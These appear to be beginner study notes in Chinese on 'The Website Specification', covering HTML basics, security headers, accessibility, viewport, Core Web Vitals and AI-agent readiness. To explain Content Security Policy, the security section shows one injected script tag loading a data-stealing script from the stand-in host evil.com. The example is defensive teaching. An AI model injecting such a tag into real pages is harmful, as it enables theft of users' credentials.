---
title: The Website Specification — 零基础学习笔记
source: https://specification.website/
date: 2026-06-13
category: Web 开发
subcategory: 网站标准与最佳实践
provenance: pipeline-v3
分类: 其他
子分类: 工程文化
---

# The Website Specification — 零基础学习笔记

## 一、它是什么：从"菜谱"说起

想象你要学做一道菜。有两种学习方式：

1. **看别人做的视频**——每一步照着做，但不知道为什么要这样做。
2. **看菜谱**——告诉你这道菜"应该"包含什么：火候、调料、摆盘标准。

**The Website Specification**（网站规范）就是互联网网站的"菜谱"。它不是编程教程，而是一份清单：一个**好的网站**「应该」具备哪些技术特征。

它由开发者 Jeroen de Valk 发起，在 GitHub 上公开维护，采用 MIT 许可。内容覆盖了从最基础的 HTML 标签，到安全头、性能优化、无障碍访问、SEO、隐私保护等十几个大类，每个类别下又分了多条具体规范。

> 核心理念：**不管你在用什么框架（React、Vue、WordPress、手工 HTML），这份规范都适用。** 它是平台无关的。

## 二、整体结构

规范按主题分成以下几个大板块，每板块包含若干条具体规则：

| 板块 | 管什么 |
|------|--------|
| Foundations（基础） | HTML 文档的基本骨架：DOCTYPE、语言声明、字符编码、标题等 |
| SEO（搜索引擎优化） | 让搜索引擎找到并正确理解你的网站 |
| Accessibility（无障碍） | 让残障人士也能使用你的网站 |
| Security（安全） | HTTPS、安全头、防攻击策略 |
| Well-Known URIs | 标准路径（如 /.well-known/）的用途 |
| Agent Readiness（AI 智能体就绪） | 让 AI 爬虫和语言模型能理解你的网站 |
| Performance（性能） | 加载速度、图片优化、缓存策略 |
| Privacy（隐私） | Cookie、用户数据保护 |
| Resilience（容错） | 错误页面、离线支持、降级策略 |
| Internationalisation（国际化） | 多语言、多地区支持 |

下面挑几个最核心、最容易上手的板块深入学习。

## 三、核心概念 1：HTML 文档的"三件套"

每一条网页的第一行，都必须严格遵循三个东西。少了任何一个，都可能出问题。

### 3.1 第一行：DOCTYPE

```html
<!doctype html>
```

这行告诉浏览器："请用现代标准模式来解析我"。如果删掉它，浏览器会退回到"怪异模式"（quirks mode）——那是 1990 年代老浏览器的兼容层，会导致 CSS 布局全部错位。

### 3.2 第二行：语言声明

```html
<html lang="zh-Hans">
```

`lang` 属性告诉屏幕阅读器、搜索引擎和浏览器：这页内容是什么语言。少了它，盲人用的屏幕阅读器会用错误的发音引擎朗读你的内容。

### 3.3 第三行：字符编码

```html
<meta charset="utf-8" />
```

UTF-8 能表示全球所有文字（包括中文、emoji）。这个声明必须放在 `<head>` 的最前面，否则浏览器可能在读到中文之前就猜错编码，导致乱码。

**三条组合在一起的完整示例：**

```html
<!doctype html>
<html lang="zh-Hans">
  <head>
    <meta charset="utf-8" />
    <title>我的第一个网页</title>
  </head>
  <body>
    <h1>你好，世界！</h1>
  </body>
</html>
```

## 四、核心概念 2：安全头（Security Headers）

安全头是服务器发给浏览器的"指令"，告诉浏览器哪些事情不允许做。

### 4.1 Content Security Policy（CSP）——最重要的安全头

CSP 告诉浏览器："只允许加载来自这些地方的脚本和图片"。它能阻止绝大多数 XSS（跨站脚本）攻击。

**没有 CSP 时的危险场景：**

假设攻击者在你的网页上注入了一行代码：

```html
<script src="https://evil.com/steal-data.js"></script>
```

浏览器会无条件执行这个来自陌生域名的脚本，把用户的登录凭据偷走。

**加上 CSP 后的保护：**

```html
<!-- 服务器返回的 HTTP 头 -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```

这行头的意思是："只允许加载我自己域名（self）的资源；脚本只允许加载我自己和 cdn.trusted.com 的。" 上面那个 `evil.com` 的脚本就会被浏览器拦截，不会执行。

**HTML 页面中也可以声明 CSP：**

```html
<head>
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self' https://cdn.trusted.com">
</head>
```

### 4.2 其他常用安全头

```http
# 防止浏览器"猜"内容类型（防攻击者把一个图片伪装成脚本）
X-Content-Type-Options: nosniff

# 防止别人把你的网页嵌进 iframe（防点击劫持）
Content-Security-Policy: frame-ancestors 'none'

# 告诉浏览器只通过 HTTPS 访问你的网站（有效期 1 年）
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 控制 referer 信息泄露程度
Referrer-Policy: strict-origin-when-cross-origin
```

## 五、核心概念 3：无障碍（Accessibility，简称 a11y）

无障碍意味着：**任何人**，无论视力、听力、运动能力如何，都能使用你的网站。

### 5.1 最小可行示例：语义化 HTML + 图片 alt 文本

```html
<!doctype html>
<html lang="zh-Hans">
  <head>
    <meta charset="utf-8" />
    <title>无障碍示例页面</title>
  </head>
  <body>
    <header>
      <nav>
        <a href="/">首页</a>
        <a href="/about">关于我们</a>
      </nav>
    </header>

    <main>
      <!-- 图片必须有 alt 描述 -->
      <img src="logo.png" alt="公司标志：一只展翅的鸟" />

      <!-- 用按钮而不是 div（按钮天然支持键盘操作和屏幕阅读器） -->
      <button type="button">提交表单</button>

      <!-- 不要写"点击这里"，要说清楚链接要去哪 -->
      <a href="/learn-more">阅读关于无障碍的更多信息</a>
    </main>

    <footer>
      <p>© 2026 示例公司</p>
    </footer>
  </body>
</html>
```

**关键要点：**

- **`<img alt>`**：屏幕阅读器会朗读 alt 的内容。空 alt（`alt=""`）表示图片是装饰性的，不需要朗读。
- **语义化标签**：`<header>`、`<nav>`、`<main>`、`<footer>` 让辅助技术能识别页面结构。
- **原生按钮**：`<button>` 天然支持键盘 Tab 导航和屏幕阅读器，而 `<div onclick>` 什么都不是。
- **链接文字要有意义**："点击这里"对屏幕阅读器用户是毫无信息的。

## 六、核心概念 4：移动适配——viewport

没有 viewport meta 标签，手机浏览器会假设你的网站是 980 像素宽的桌面版，然后把它缩小显示——文字小到看不见，按钮小到点不了。

```html
<meta name="viewport" content="width=device-width, initial-scale=1" />
```

这**一行代码**就解决了 90% 的手机适配问题。

- `width=device-width`：用手机的真实宽度作为排版宽度。
- `initial-scale=1`：初始缩放比例为 1:1。

**永远不要**加 `user-scalable=no`，这会阻止用户缩放文字，对低视力用户是灾难性的。

## 七、核心概念 5：性能——Core Web Vitals

Google 定义了三个核心性能指标，直接影响搜索排名和用户感受：

| 指标 | 全称 | 含义 | 优秀标准 |
|------|------|------|----------|
| LCP | Largest Contentful Paint | 最大内容加载完成时间 | ≤ 2.5 秒 |
| INP | Interaction to Next Paint | 用户点击后的响应速度 | ≤ 200 毫秒 |
| CLS | Cumulative Layout Shift | 页面加载过程中的布局抖动 | ≤ 0.1 |

**一个简单的性能优化组合示例：**

```html
<head>
  <!-- 1. 声明字符编码和语言 -->
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- 2. 预加载关键资源 -->
  <link rel="preload" href="/fonts/primary.woff2" as="font" type="font/woff2" crossorigin />

  <!-- 3. 延迟加载非关键脚本 -->
  <script src="/app.js" defer></script>

  <!-- 4. 图片设置明确尺寸，避免布局抖动（CLS） -->
  <img src="hero.jpg" alt="示例图片" width="800" height="400" loading="lazy" />
</head>
```

**三条性能优化原则：**

1. **`defer`**：让脚本在页面解析完后才执行，不阻塞渲染。
2. **`loading="lazy"`**：非首屏图片延迟加载，减少初始请求量。
3. **图片设置 `width` 和 `height`**：浏览器提前预留空间，避免加载时布局跳动（CLS）。

## 八、核心概念 6：AI 智能体就绪（Agent Readiness）

这是 2024 年以来新增的板块。随着 AI 聊天机器人和智能体开始"阅读"网页，网站需要让机器也看得懂。

- **`/llms.txt`**：类似 `/sitemap.xml`，但给 AI 看的。放在网站根目录，列出你最重要的页面。
- **结构化数据（JSON-LD）**：用机器可读的格式标注页面内容，Google 搜索和 AI 代理都用它。
- **稳定的 URL**：一旦发布的链接就不要再改，否则 AI 引用的内容会失效。

## 九、总结：一份"检查清单"

如果你是初学者，不必一次掌握全部规范。按以下顺序逐步实施：

1. **第一层（必做）**：DOCTYPE + lang + charset + viewport + title
2. **第二层（安全）**：HTTPS + CSP + X-Content-Type-Options
3. **第三层（性能）**：图片优化 + defer 脚本 + 明确的宽高
4. **第四层（无障碍）**：语义化标签 + alt 文本 + 有意义的链接文字
5. **第五层（SEO）**：meta description + canonical + sitemap
6. **第六层（进阶）**：AI 智能体就绪 + 隐私合规 + 国际化

The Website Specification 的特别之处不在于它"教"你写代码，而在于它告诉你：**写好一个网站，不只是功能能跑就行，它应该在安全、性能、无障碍、隐私等每个维度都达到一个基本标准。** 这份清单，就是那个标准的定义。

## 十、参考资料

- 官方网站：https://specification.website/
- GitHub 源码：https://github.com/jdevalk/specification.website
- MCP 服务：https://mcp.specification.website/mcp（AI 智能体可查询此规范）
- Agent Skill：https://specification.website/.well-known/agent-skills/specification-website/SKILL.md
